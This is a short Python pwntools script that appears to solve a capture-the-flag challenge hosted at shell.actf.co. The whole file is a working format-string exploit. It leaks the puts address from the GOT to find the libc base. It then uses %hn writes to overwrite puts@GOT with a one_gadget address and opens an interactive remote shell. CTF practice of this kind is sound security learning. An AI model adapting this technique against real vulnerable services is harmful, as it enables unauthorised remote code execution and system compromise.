from pwn import *

R = remote('shell.actf.co', 20201)

puts_got = 0x601018
puts_offset = 0x6f690
gadget_offset = 0x4526a

def leak_libc(r):
    p = b"%9$sAAAA" + p64(puts_got)
    r.sendlineafter("your name?", p)
    r.recvuntil("Why hello there ")
    puts = u64(r.recv(6).ljust(8, b'\x00'))
    libc_base = puts-puts_offset
    log.info("libc_base: "+hex(libc_base))
    return libc_base

def run_shell(r, libc_base):
    one_gadget = gadget_offset + libc_base
    one_gadget_1 = "0x"+hex(one_gadget)[-4:]
    one_gadget_1 = int(one_gadget_1, 16)
    one_gadget_2 = "0x"+hex(one_gadget)[-8:-4]
    one_gadget_2 = int(one_gadget_2, 16)

    if one_gadget_1 >= one_gadget_2:
        log.error("Failed to fsb.")
        exit(1)
    
    p = "%{}c%20$hn".format(one_gadget_1) 
    one_gadget_2_c = one_gadget_2 - one_gadget_1
    p += "%{}c%21$hn".format(one_gadget_2_c)
    p += "A"*(32-len(p))
    p = p.encode() + p64(puts_got) + p64(puts_got+2)
    r.sendlineafter("And what book would you like to check out?", p)
    
    r.interactive()

def main(r):
    libc_base = leak_libc(r)
    run_shell(r, libc_base)

if __name__ == '__main__':
    main(R)
